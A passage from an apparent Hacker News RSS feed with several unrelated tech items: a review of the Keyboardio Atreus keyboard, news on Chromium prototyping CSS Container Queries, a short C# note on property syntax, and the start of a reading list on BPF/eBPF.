		<p>I've bought another mechanical keyboard (technically - I've backed <a href="https://www.kickstarter.com/projects/keyboardio/atreus">the Kickstarter campaign</a>). Feel free to call me an addict - I don't mind. It's my 4th and all three that I already have work well until now, so I have no valid reason to complain about them. Why waste money then (as they were not cheap - we're talking about an expenditure of 130+ USD per keyboard)?</p><p>The truth is, I use more than one computer (on a daily basis). Desktop PC powered by Windows 10, my private development machine (macOS), and the one provided by the company I currently cooperate with (Ubuntu 20). That means constant switching between very different keyboards and layouts. MacBook Pro's keyboard is pure rubbish (even the refined scissor 2020 model), Lenovo Thinkpad's one is a bit better but still very far from typing experience achievable only for mechanical keyboards, my desktop keyboard is fine but freakin' huge.</p><p>That's why I've decided that what I really need is a reliable mechanical keyboard <strong>I could carry with me easily</strong> and plug anywhere I want.</p><p>Sounds easy, but there are objective obstacles. Mechanical keyboards are generally large and heavy. Both Das Keyboards I own are 100% out of the question here. I have an 88 WASD keyboard as well, but even w/o a numerical keypad, it's too big to carry in the backpack.</p><p>Atreus to the rescue.</p><p>The brand "Atreus" is not new. If you're into mechanical keyboards, you've probably heard about <a href="https://atreus.technomancy.us/">Classic Atreus</a> - as it's available since 2014. The concept was very simple - to create a mechanical keyboard that is fully optimized for natural palms position, so you have all the keys within reach w/o making any move. That also means minimizing the number of keycaps by doing some crazy optimizations (more about that later).</p><p>The keyboard I've ordered is a product of cooperation of <strong>Atreus</strong> and <strong>Keyboardio</strong> - a refreshed, minimalistic version of Classic Atreus with few slight improvements aimed to make it even more compact and apply the lessons from previous models (e.g., adjust the keys in the very center area). You can read more about it (incl. specs and design decisions) <a href="https://shop.keyboard.io/products/keyboardio-atreus">here</a>.</p><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/11/atreus_top.jpg" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/11/atreus_top.jpg 600w, https://no-kill-switch.ghost.io/content/images/2020/11/atreus_top.jpg 900w" sizes="(min-width: 720px) 720px"></figure><p>I've ordered a blank model (no symbols on the top of keycaps) with <strong>Kailh BOX White switches</strong> and the dedicated case. It's the first model with Kailh switches I've ever tried. The white ones are clicky and have very early tactile feedback. I'm not going to delay that message - the switches turned out to be <u>AWESOME</u>. The typing experience is extremely satisfying (IMHO better than Cherry MX Clear or Gamma Zulu ones). It does require some (reasonable) force, but in exchange, you get the subliminal certainty (the one that doesn't involve conscious thinking) of whether you pressed the button effectively (once) or not.</p><p>OK, good switches are important, but what about the layout? If you've used previous models of Atreus before, you won't be surprised - the changes are subtle but not revolutionary. If you had no prior experience with Atreus, it may be a real shocker.</p><p>First of all, the keyboard has only <strong>44 keycaps</strong> (yay). The space bar is of the size of any other keycap. There are three modes - black, blue, and red (officially named: default, fun, and upper). Default is ... well, default. Fun is active when you <u>hold</u> the 'Fun' button (3rd from the left in the bottom row of the right part of the keyboard) and upper is <u>switched on</u> by (pressing, you don't need to hold them) <strong>Fun</strong> &amp; <strong>Esc</strong> combo.</p><figure><img src="https://no-kill-switch.ghost.io/content/images/2020/11/atreus.png" alt="" srcset="https://no-kill-switch.ghost.io/content/images/size/w600/2020/11/atreus.png 600w, https://no-kill-switch.ghost.io/content/images/2020/11/atreus.png 680w"></figure><p>Some "standard" keys are entirely missing (e.g., <strong>Caps Lock</strong>), some have very un-intuitive positions (<strong>Escape</strong>, <strong>Tab</strong>, <strong>Backspace</strong>). You can read about the layout on the official page (linked above), so I'm not going to describe all the nuances - I'd like to focus on the impressions instead: how does it work? Is it easy to get used to? Convenient? How does it work for typical development keystrokes/routines?</p><p>It ... depends.</p><p>It didn't take me much time to get used to typing texts (articles, blog posts, e-mails) - the layout is a bit skewed, but still: it's QWERTY. The most mistakes I was making were in the 3rd row (<strong>'b'</strong>, <strong>'c'</strong> and <strong>'m'</strong>). However, getting accustomed to control/function keys is an entirely different kind of story:</p><ul><li><strong>Backspace</strong>/<strong>Space</strong> tandem is very different to what you know but once you try it, it gets very intuitive</li><li><strong>Ctrl</strong> and <strong>Alt</strong> are well within reach, but they force you to change your mechanical habits - that will take time</li><li><strong>Tab</strong>'s positioning is the most surprising - it's probably the least reachable keycap on the board</li><li>Having <strong>Delete</strong> in the red (upper) mode means that you're pretty much restricted to using <strong>Backspace</strong></li><li>All kinds of parenthesis (in the blue mode) require memorization from scratch</li><li>TBH I don't use red mode at all - it's just too much of a hassle (that means no <strong>PageUp</strong>, <strong>PageDown</strong>, <strong>F1 </strong>... <strong>F12 </strong>keys - but TBH I've used them very rarely anyway)</li></ul><hr><p><em>A side-note: I don't use Vim, I've also recently gave up on Spacemacs. Last months for codecrafting I've used mainly SublimeText + TabNine (80%) and Visual Studio Code (20%).</em></p><p>After two weeks of using Atreus, it feels like I'm still <u>terribly slow</u> - quite fluent, can manage without a cheatsheet, but still - just painfully slooow. The new automations (you don't need to think about) are not (yet) there, and the old ones got rusty already (when I try to use Das Keyboard occasionally). Ahh, yeah - I've mentioned the printed cheat sheet - it comes in the box with the keyboard, it's laminated, and it's a hell of help - especially in the first few days. A decent idea - kudos for that.</p><p>To be honest, I think that those few weeks are still too little to make a proper judgment, so let's consider it an early review and revisit in few months time.</p><p>IMHO, Atreus delivers what it promises. </p><p>It's compact and lightweight indeed. The quality (of manufacturing) is flawless - sharp, raw, minimalistic, yet beautiful.</p><p>Overall, it's my 2nd favorite of all mech keyboards I've ever used (runner up only to the <a href="https://www.wasdkeyboards.com/wasd-v3-88-key-iso-custom-mechanical-keyboard.html">Cherry MX Clear 88-key WASD</a>), and that says a lot. Yes, this position has been earned mainly by the outstanding switches and the unquestionable mobility, but it's not that I classify the layout as a con. It does require time to adjust your habits, but it's hard to name even a single, irrevocably bad design decision (in terms of positioning or spacing) - with <strong>Tab</strong> positioning being the most controversial one.</p><p>Btw. if you don't like any particular key position, there's a dedicated piece of software (Chrysalis: <a href="https://github.com/keyboardio/Chrysalis">https://github.com/keyboardio/Chrysalis</a>) you can use to conveniently remap it (in the end: I didn't remap any single key).</p><p>It should be stated very clearly - IMHO, this keyboard is <strong><u>much better suited for typists</u></strong> than e.g., developers (or gamers), but even for a typist, it will take several weeks to get used to it and regain a proper pace of typing. What does it mean 'proper pace'? Is it possible to get as effective as with a standard IBM Model M layout?</p><p>Opinions vary.</p><p>Personally, I don't think so, but please keep in mind that this is not a 105-cap but 44-cap keyboard - some efficiency is intended to be sacrificed for the compactness. Consider carefully the scenarios you'd like to use it for, before, not after buying.</p>
	</section>

	
</article></div>]]>
            </description>
            <link>https://no-kill-switch.ghost.io/keyboardio-atreus-yeah-or-meh-review/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056988</guid>
            <pubDate>Wed, 11 Nov 2020 09:45:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Container Queries are coming to Chromium]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056551">thread link</a>) | @LorenzA
<br/>
November 11, 2020 | https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com | <a href="https://web.archive.org/web/*/https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<div id="primary">
<main id="main">
<article id="post-25159">

<div>
<p><img loading="lazy" src="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png" alt="" width="2024" height="880" srcset="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png 2024w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-560x243.png 560w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1120x487.png 1120w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-768x334.png 768w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1536x668.png 1536w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1568x682.png 1568w" sizes="(max-width: 2024px) 100vw, 2024px" data-old-src="https://www.bram.us/wordpress/wp-content/plugins/native-lazyload/assets/images/placeholder.svg" data-src="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png" data-srcset="https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon.png 2024w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-560x243.png 560w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1120x487.png 1120w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-768x334.png 768w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1536x668.png 1536w, https://www.bram.us/wordpress/wp-content/uploads/2020/11/carbon-1568x682.png 1568w"></p>
<p>Just <a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/u1AKdrXhPGI/m/wrJb-unhAgAJ">announced</a> on the Chromium mailing list is an <a href="https://www.chromium.org/blink/launching-features">“Intent to Prototype”</a> Container Queries, which is quite exciting news 🎉</p>
<details>
<summary>🤔 Container Queries?</summary>
<p>Container Queries allow authors to style elements according to the size of a container. This is similar to a @media query, except that it evaluates against a container instead of the viewport.</p>
</details>
<p>The experimental implementation will follow <a href="https://gist.github.com/mirisuzanne/748169312f110d6246e092945673b16e">Miriam Suzanne’s proposal</a>, which looks like this:</p>
<pre><code>main,
aside {
  contain: size; /* (1) Create an implicit "container root" or "containment context" */
}

.media-object {
  display: grid;
  gap: 1em;
}

@container (max-width: 45em) { /* (2) When the nearest `contain: size` ancestor has a max-width of 45em … */
  .media-object { /* … apply these rules onto .media-object */
    grid-template: 'img content' auto / auto 1fr;
  }
}</code></pre>
<p>Using <code>contain: size</code> <em>(1)</em> will create an implicit “container root” or “containment context” on that element. Elements contained inside it can then have container queries applied onto them, by use of a new at-rule <code>@container (<em>&lt;container-media-query&gt;</em>)</code> <em>(2)</em>. The target selector and CSS rules to apply in that case are nested within the <code>@container</code> at-rule, just like we already do with other at-rules.</p>
<p>In the example above extra rules will be applied to <code>.media-object</code> whenever its nearest ancestor with size containment set — such as <code>&lt;main&gt;</code> or <code>&lt;aside&gt;</code> — has a <code>max-width</code> of <code>45em</code>.</p>
<p>~</p>
<p>A <a href="https://github.com/dbaron/container-queries-implementability#proposal">previous version of this proposal by L. David Baron</a> required a context selector to be set, but that has been dropped here. The <code>@container</code> rule from Miriam’s version will work in any containment context <em>(read: the nearest parent element that has <code>contain: size</code> set)</em>. The syntax might still change, but that’s irrelevant to the prototype which is to be implemented:</p>
<blockquote><p>This is not at all finalized, but the underlying problems we need to solve in Blink are (mostly) the same regardless of how the feature is accessed, so we’ll for now use this proposal as the temporary syntax.</p></blockquote>
<p>~</p>
<p><a href="https://groups.google.com/a/chromium.org/g/blink-dev/c/u1AKdrXhPGI/m/wrJb-unhAgAJ">Intent to Prototype: Container Queries →</a><br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1145970">Chrome Tracking Bug →</a></p>
<div>
<p><b>Did this help you out? Like what you see?<br>Thank me with a coffee.</b></p><p>I don't do this for profit but a small one-time donation would always put a smile on my face. Thanks!</p>
<p><a href="https://www.paypal.me/bramus/3EUR">☕️ Buy me a Coffee <em>(€3)</em></a></p>
</div>
</div>

<div>

<p>
Bramus is a Freelance Web Developer from Belgium. From the moment he discovered view-source at the age of 14 <em>(way back in 1997)</em>, he fell in love with the web and has been tinkering with it ever since <i><a href="https://www.bram.us/about">(more …)</a></i> <a href="https://www.bram.us/author/bramus/" rel="author">
View more posts </a>
</p>
</div>
</article>
<nav role="navigation" aria-label="Posts">
<h2>Post navigation</h2>

</nav>

</main>
</div>
</div></div>]]>
            </description>
            <link>https://www.bram.us/2020/11/05/container-queries-are-coming-to-chromium/?ref=webdesignernews.com</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056551</guid>
            <pubDate>Wed, 11 Nov 2020 08:28:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Back to C# basics: Difference between “=” and “{ get; } =” for properties]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25056344">thread link</a>) | @cincura_net
<br/>
November 10, 2020 | https://www.tabsoverspaces.com/id/233844 | <a href="https://web.archive.org/web/*/https://www.tabsoverspaces.com/id/233844">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
	<h3>Back to C# basics: Difference between "=&gt;" and "{ get; } =" for properties <a href="https://www.tabsoverspaces.com/id/233844" rel="bookmark nofollow" title="Permalink"><span aria-label="Permalink"></span></a></h3>
	<p>
	<span aria-label="Published"></span> 11 Nov 2020
	<span></span>
	<span aria-label="Time to read"></span> 1 mins
	<span></span>
	<span aria-label="Tags"></span> .NET
</p>
<p>I recently realized, the difference between <code>=&gt;</code> and <code>{ get; } =</code> for properties might not be as known as everybody thinks, based on code I saw multiple times.</p>
<!-- excerpt --> 
<p>Here’s an example code.</p>
<pre><code>public class C
{
	public Foo A { get; } = new Foo();
	public Foo B =&gt; new Foo();
}
</code></pre>
<p>Is it the same or is it not? The answer is, it’s not the same. The <code>A</code> property is property with <em>getter</em> only (aka read only or immutable property). When <code>C</code> instance is created a new instance of <code>Foo</code> is assigned to the property and will be returned from now on. The <code>B</code> property defines also only <em>getter</em>, but this time the <em>getter</em> contains the <code>new Foo();</code> as it’s body, aka returning new instance of <code>Foo</code> every time you access <code>B</code>.</p>
<p>Putting it into barebone C#, it would look like this.</p>
<pre><code>public class C
{
	readonly Foo _a = new Foo();
	
	public Foo A
	{
		get { return _a; }
	}

	public Foo B
	{
		get { return new Foo(); }
	}
}
</code></pre>
<p>Makes sense?</p>

</article><article>
	<p>
		<a href="https://www.tabsoverspaces.com/about"><img src="https://www.tabsoverspaces.com/assets/bio_image.png" alt="Profile Picture"></a>
		Jiří Činčura is an independent developer focusing on data and business layers, language constructs, parallelism and databases. Specifically Entity Framework, asynchronous and parallel programming, cloud and Azure. He's Microsoft Most Valuable Professional and you can read his articles, guides, tips and tricks at www.tabsoverspaces.com.
	</p>
</article></div>]]>
            </description>
            <link>https://www.tabsoverspaces.com/id/233844</link>
            <guid isPermaLink="false">hacker-news-small-sites-25056344</guid>
            <pubDate>Wed, 11 Nov 2020 07:47:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cell Signaling Technologies – Detailed 3D model of human cells]]>
            </title>
            <description>
<![CDATA[
Score 163 | Comments 50 (<a href="https://news.ycombinator.com/item?id=25055908">thread link</a>) | @ozten
<br/>
November 10, 2020 | http://www.digizyme.com/cst_landscapes.html | <a href="https://web.archive.org/web/*/http://www.digizyme.com/cst_landscapes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="u6389-bw">
     <div id="u6389"><!-- column -->
      <div id="u6389_align_to_page">
       <!-- m_editable region-id="editable-static-tag-U6264-BP_infinity" template="cst_landscapes.html" data-type="html" data-ice-options="disableImageResize,link,txtStyleTarget" -->
       <p><span id="u6264">Cell Signaling Technologies</span></p>
       <!-- /m_editable -->
       <!-- m_editable region-id="editable-static-tag-U6399-BP_infinity" template="cst_landscapes.html" data-type="html" data-ice-options="disableImageResize,link,txtStyleTarget" -->
       <p>Molecular Landscapes</p>
       <!-- /m_editable -->
       
       
       
      </div>
     </div>
    </div></div>]]>
            </description>
            <link>http://www.digizyme.com/cst_landscapes.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25055908</guid>
            <pubDate>Wed, 11 Nov 2020 06:02:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dive into BPF: a list of reading material]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25055866">thread link</a>) | @moks
<br/>
November 10, 2020 | https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/ | <a href="https://web.archive.org/web/*/https://qmonnet.github.io/whirl-offload/2016/09/01/dive-into-bpf/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
<ul id="markdown-toc">
  <li><a href="#what-is-bpf" id="markdown-toc-what-is-bpf">What is BPF?</a></li>
  <li><a href="#dive-into-the-bytecode" id="markdown-toc-dive-into-the-bytecode">Dive into the bytecode</a></li>
  <li><a href="#resources" id="markdown-toc-resources">Resources</a>    <ul>
      <li><a href="#generic-presentations" id="markdown-toc-generic-presentations">Generic presentations</a>        <ul>
          <li><a href="#about-bpf" id="markdown-toc-about-bpf">About BPF</a></li>
          <li><a href="#about-xdp" id="markdown-toc-about-xdp">About XDP</a></li>
          <li><a href="#about-other-components-related-or-based-on-ebpf" id="markdown-toc-about-other-components-related-or-based-on-ebpf">About other components related or based on eBPF</a></li>
        </ul>
      </li>
      <li><a href="#documentation" id="markdown-toc-documentation">Documentation</a>        <ul>
          <li><a href="#about-bpf-1" id="markdown-toc-about-bpf-1">About BPF</a></li>
          <li><a href="#about-tc" id="markdown-toc-about-tc">About tc</a></li>
          <li><a href="#about-xdp-1" id="markdown-toc-about-xdp-1">About XDP</a></li>
          <li><a href="#about-flow-dissectors" id="markdown-toc-about-flow-dissectors">About flow dissectors</a></li>
          <li><a href="#about-p4-and-bpf" id="markdown-toc-about-p4-and-bpf">About P4 and BPF</a></li>
        </ul>
      </li>
      <li><a href="#tutorials" id="markdown-toc-tutorials">Tutorials</a></li>
      <li><a href="#examples" id="markdown-toc-examples">Examples</a>        <ul>
          <li><a href="#from-the-kernel" id="markdown-toc-from-the-kernel">From the kernel</a></li>
          <li><a href="#from-package-iproute2" id="markdown-toc-from-package-iproute2">From package iproute2</a></li>
          <li><a href="#from-bcc-set-of-tools" id="markdown-toc-from-bcc-set-of-tools">From bcc set of tools</a></li>
          <li><a href="#other-examples" id="markdown-toc-other-examples">Other examples</a></li>
          <li><a href="#manual-pages" id="markdown-toc-manual-pages">Manual pages</a></li>
        </ul>
      </li>
      <li><a href="#the-code" id="markdown-toc-the-code">The code</a>        <ul>
          <li><a href="#bpf-code-in-the-kernel" id="markdown-toc-bpf-code-in-the-kernel">BPF code in the kernel</a></li>
          <li><a href="#xdp-hooks-code" id="markdown-toc-xdp-hooks-code">XDP hooks code</a></li>
          <li><a href="#bpf-logic-in-bcc" id="markdown-toc-bpf-logic-in-bcc">BPF logic in bcc</a></li>
          <li><a href="#code-to-manage-bpf-with-tc" id="markdown-toc-code-to-manage-bpf-with-tc">Code to manage BPF with tc</a></li>
          <li><a href="#bpf-utilities" id="markdown-toc-bpf-utilities">BPF utilities</a></li>
          <li><a href="#other-interesting-chunks" id="markdown-toc-other-interesting-chunks">Other interesting chunks</a></li>
          <li><a href="#llvm-backend" id="markdown-toc-llvm-backend">LLVM backend</a></li>
          <li><a href="#running-in-userspace" id="markdown-toc-running-in-userspace">Running in userspace</a></li>
          <li><a href="#commit-logs" id="markdown-toc-commit-logs">Commit logs</a></li>
        </ul>
      </li>
      <li><a href="#troubleshooting" id="markdown-toc-troubleshooting">Troubleshooting</a>        <ul>
          <li><a href="#errors-at-compilation-time" id="markdown-toc-errors-at-compilation-time">Errors at compilation time</a></li>
          <li><a href="#errors-at-load-and-run-time" id="markdown-toc-errors-at-load-and-run-time">Errors at load and run time</a></li>
        </ul>
      </li>
      <li><a href="#and-still-more" id="markdown-toc-and-still-more">And still more!</a></li>
    </ul>
  </li>
</ul>

<p><em>~ <a href="https://github.com/qmonnet/whirl-offload/commits/gh-pages/_posts/2016-09-01-dive-into-bpf.md">Updated</a> 2019-01-10 ~</em></p>



<p>BPF, as in <strong>B</strong>erkeley <strong>P</strong>acket <strong>F</strong>ilter, was initially conceived in 1992
so as to provide a way to filter packets and to avoid useless packet copies
from kernel to userspace. It initially consisted in a simple bytecode that is
injected from userspace into the kernel, where it is checked by a verifier—to
prevent kernel crashes or security issues—and attached to a socket, then run on
each received packet. It was ported to Linux a couple of years later, and used
for a small number of applications (tcpdump for example). The simplicity of the
language as well as the existence of an in-kernel Just-In-Time (JIT) compiling
machine for BPF were factors for the excellent performances of this tool.</p>

<p>Then in 2013, Alexei Starovoitov completely reshaped it, started to add new
functionalities and to improve the performances of BPF. This new version is
designated as eBPF (for “extended BPF”), while the former becomes cBPF
(“classic” BPF). New features such as maps and tail calls appeared. The JIT
machines were rewritten. The new language is even closer to native machine
language than cBPF was. And also, new attach points in the kernel have been
created.</p>

<p>Thanks to those new hooks, eBPF programs can be designed for a variety of use
cases, that divide into two fields of applications. One of them is the domain
of kernel tracing and event monitoring. BPF programs can be attached to kprobes
and they compare with other tracing methods, with many advantages (and
sometimes some drawbacks).</p>

<p>The other application domain remains network programming. In addition to socket
filter, eBPF programs can be attached to tc (Linux traffic control tool)
ingress or egress interfaces and perform a variety of packet processing tasks,
in an efficient way. This opens new perspectives in the domain.</p>

<p>And eBPF performances are further leveraged through the technologies developed
for the IO Visor project: new hooks have also been added for XDP (“eXpress Data
Path”), a new fast path recently added to the kernel. XDP works in conjunction
with the Linux stack, and relies on BPF to perform very fast packet processing.</p>

<p>Even some projects such as P4, Open vSwitch,
<a href="http://openvswitch.org/pipermail/ovs-dev/2014-October/047421.html">consider</a>
or started to approach BPF. Some others, such as CETH, Cilium, are entirely
based on it. BPF is buzzing, so we can expect a lot of tools and projects to
orbit around it soon…</p>



<p>As for me: some of my work (including for
<a href="https://qmonnet.github.io/whirl-offload/2016/07/15/beba-research-project/">BEBA</a>)
is closely related to eBPF, and several future articles on this site will focus
on this topic. Logically, I wanted to somehow introduce BPF on this blog before
going down to the details—I mean, a real introduction, more developed on BPF
functionalities that the brief abstract provided in first section: What are BPF
maps? Tail calls? What do the internals look like? And so on. But there are a
lot of presentations on this topic available on the web already, and I do not
wish to create “yet another BPF introduction” that would come as a duplicate of
existing documents.</p>

<p>So instead, here is what we will do. After all, I spent some time reading and
learning about BPF, and while doing so, I gathered a fair amount of material
about BPF: introductions, documentation, but also tutorials or examples. There
is a lot to read, but in order to read it, one has to <em>find</em> it first.
Therefore, as an attempt to help people who wish to learn and use BPF, the
present article introduces a list of resources. These are various kinds of
readings, that hopefully will help you dive into the mechanics of this kernel
bytecode.</p>



<figure>
  <img src="https://qmonnet.github.io/whirl-offload/img/icons/pic.svg">
</figure>

<h2 id="generic-presentations">Generic presentations</h2>

<p>The documents linked below provide a generic overview of BPF, or of some
closely related topics. If you are very new to BPF, you can try picking a
couple of presentation among the first ones and reading the ones you like most.
If you know eBPF already, you probably want to target specific topics instead,
lower down in the list.</p>

<h3 id="about-bpf">About BPF</h3>

<p>Generic presentations about eBPF:</p>

<ul>
  <li>
    <p><a href="https://blogs.igalia.com/dpino/2019/01/07/introduction-to-xdp-and-ebpf/"><em>A brief introduction to XDP and eBPF</em></a>
(Diego Pino García, January 2019): <br>
An excellent and accessible introduction providing context, history, and
details about the functioning of eBPF.</p>
  </li>
  <li>
    <p><a href="https://www.redhat.com/en/blog/introduction-ebpf-red-hat-enterprise-linux-7"><em>Introduction to eBPF in Red Hat Enterprise Linux 7</em></a>
(Stanislav Kozina, January 2019): <br>
Focusing on the eBPF features arriving in Red Hat.</p>
  </li>
  <li>
    <p><a href="http://fulvio.frisso.net/files/18HPSR%20-%20eBPF.pdf"><em>Toward Flexible and Efficient In-Kernel Network Function Chaining with IO Visor</em></a>
(Fulvio Risso, HPSR 2018, Bucharest, June 2018): <br>
A generic introduction to BPF, XDP, IO Visor, bcc and other components.</p>
  </li>
  <li>
    <p><a href="https://lwn.net/Articles/740157/"><em>A thorough introduction to eBPF</em></a>
(Matt Flemming, on LWN.net, December 2017): <br>
A well-written and accessible introduction providing an overview of eBPF
subsystem components.</p>
  </li>
  <li>
    <p><a href="http://schd.ws/hosted_files/ossna2017/da/BPFandXDP.pdf"><em>Making the Kernel’s Networking Data Path Programmable with BPF and XDP</em></a>
(Daniel Borkmann, OSSNA17, Los Angeles, September 2017):<br>
One of the best set of slides available to understand quickly all the basics about eBPF and XDP (mostly for network processing).</p>
  </li>
  <li>
    <p><a href="https://speakerdeck.com/tuxology/the-bsd-packet-filter">The BSD Packet Filter</a>
(Suchakra Sharma, June 2017): <br>
A very nice introduction, mostly about the tracing aspects.</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/brendangregg/bpf-tracing-and-more"><em>BPF: tracing and more</em></a>
(Brendan Gregg, January 2017):<br>
Mostly about the tracing use cases.</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/brendangregg/linux-bpf-superpowers"><em>Linux BPF Superpowers</em></a>
(Brendan Gregg, March 2016):<br>
With a first part on the use of <strong>flame graphs</strong>.</p>
  </li>
  <li>
    <p><a href="https://www.socallinuxexpo.org/sites/default/files/presentations/Room%20211%20-%20IOVisor%20-%20SCaLE%2014x.pdf"><em>IO Visor</em></a>
(Brenden Blanco, SCaLE 14x, January 2016):<br>
Also introduces <strong>IO Visor project</strong>.</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/ebpf_on_the_mainframe_lcon_2015.pdf"><em>eBPF on the Mainframe</em></a>
(Michael Holzheu, LinuxCon, Dublin, October 2015)</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/tracing-linux-ezannoni-linuxcon-ja-2015_0.pdf"><em>New (and Exciting!) Developments in Linux Tracing</em></a>
(Elena Zannoni, LinuxCon, Japan, 2015)</p>
  </li>
  <li>
    <p><a href="https://events.linuxfoundation.org/sites/events/files/slides/bpf_collabsummit_2015feb20.pdf"><em>BPF — in-kernel virtual machine</em></a>
(Alexei Starovoitov, February 2015):<br>
Presentation by the author of eBPF.</p>
  </li>
  <li>
    <p><a href="https://lwn.net/Articles/603983/"><em>Extending extended BPF</em></a>
(Jonathan Corbet, July 2014)</p>
  </li>
</ul>

<p><strong>BPF internals</strong>:</p>

<ul>
  <li>Daniel Borkmann has been doing an amazing work to present <strong>the internals</strong> of eBPF, in particular about <strong>its use with tc</strong>, through several talks and papers.
    <ul>
      <li><a href="http://netdevconf.org/1.2/session.html?daniel-borkmann"><em>Advanced programmability and recent updates with tc’s cls_bpf</em></a>
(netdev 1.2, Tokyo, October 2016):<br>
Daniel provides details on eBPF, its use for tunneling and encapsulation,
direct packet access, and other features.</li>
      <li><a href="http://netdevconf.org/1.2/slides/oct5/07_tcws_daniel_borkmann_2016_tcws.pdf"><em>cls_bpf/eBPF updates since netdev 1.1</em></a>
(netdev 1.2, Tokyo, October 2016, part of
<a href="http://netdevconf.org/1.2/session.html?jamal-tc-workshop">this tc workshop</a>)</li>
      <li><a href="http://www.netdevconf.org/1.1/proceedings/slides/borkmann-tc-classifier-cls-bpf.pdf"><em>On getting tc classifier fully programmable with cls_bpf</em></a>
(netdev 1.1, Sevilla, February 2016):<br>
After introducing eBPF, this presentation provides insights on many
internal BPF mechanisms (map management, tail calls, verifier). A
must-read! For the most ambitious,
<a href="http://www.netdevconf.org/1.1/proceedings/papers/On-getting-tc-classifier-fully-programmable-with-cls-bpf.pdf">the full paper is available here</a>.</li>
      <li><a href="https://archive.fosdem.org/2016/schedule/event/ebpf/attachments/slides/1159/export/events/attachments/ebpf/slides/1159/ebpf.pdf"><em>Linux tc and eBPF</em></a>
(fosdem16, Brussels, Belgium, January 2016)</li>
      <li><a href="https://fosdem.org/2017/schedule/event/ebpf_xdp/"><em>eBPF and XDP walkthrough and recent updates</em></a>
(fosdem17, Brussels, Belgium, February 2017)</li>
    </ul>

    <p>These presentations are probably one of the best sources of documentation to
understand the design and implementation of internal mechanisms of eBPF.</p>
  </li>
</ul>

<p>The <a href="https://www.iovisor.org/resources/blog"><strong>IO Visor blog</strong></a> has some
interesting technical articles about BPF. Some of them contain a bit of
marketing talks.</p>

<p>As of early 2019, there are more and more presentations being done around
multiple aspects of BPF. One nice example is
<a href="http://vger.kernel.org/lpc-bpf.html">the BPF track</a> that was held in parallel
to the Linux Plumbers Conference in late 2018 (and should be held again on
coming years), where lots of topics related to eBPF development or use cases
were presented.</p>

<p><strong>Kernel tracing</strong>: summing up all existing methods, including BPF:</p>

<ul>
  <li>
    <p><a href="http://www.slideshare.net/vh21/meet-cutebetweenebpfandtracing"><em>Meet-cute between eBPF and Kerne Tracing</em></a>
(Viller Hsiao, July 2016):<br>
Kprobes, uprobes, ftrace</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/vh21/linux-kernel-tracing"><em>Linux Kernel Tracing</em></a>
(Viller Hsiao, July 2016):<br>
Systemtap, Kernelshark, trace-cmd, LTTng, perf-tool, ftrace, hist-trigger,
perf, function tracer, tracepoint, kprobe/uprobe…</p>
  </li>
</ul>

<p>Regarding <strong>event tracing and monitoring</strong>, Brendan Gregg uses eBPF a lot and
does an excellent job at documenting some of his use cases. If you are in
kernel tracing, you should see his blog articles related to eBPF or to flame
graphs. Most of it are accessible
<a href="http://www.brendangregg.com/blog/2016-03-05/linux-bpf-superpowers.html">from this article</a>
or by browsing his blog.</p>

<p>Introducing BPF, but also presenting <strong>generic concepts of Linux networking</strong>:</p>

<ul>
  <li>
    <p><a href="http://www.slideshare.net/ThomasGraf5/linux-networking-explained"><em>Linux Networking Explained</em></a>
(Thomas Graf, LinuxCon, Toronto, August 2016)</p>
  </li>
  <li>
    <p><a href="http://www.slideshare.net/ThomasGraf5/linuxcon-2015-linux-kernel-networking-walkthrough"><em>Kernel Networking Walkthrough</em></a>
(Thomas Graf, LinuxCon, Seattle, August 2015)</p>
  </li>
</ul>

<p><strong>Hardware offload</strong>:</p>

<ul>
  <li>eBPF with tc or XDP supports hardware offload, starting with Linux kernel
version 4.9 and introduced by Netronome. Here is a presentation about this
feature:<br>
<a href="http://netdevconf.org/1.2/session.html?jakub-kicinski">eBPF/XDP hardware offload to SmartNICs</a>
(Jakub Kicinski and Nic Viljoen, netdev 1.2, Tokyo, October 2016)</li>
  <li>An updated version was presented on year later:<br>
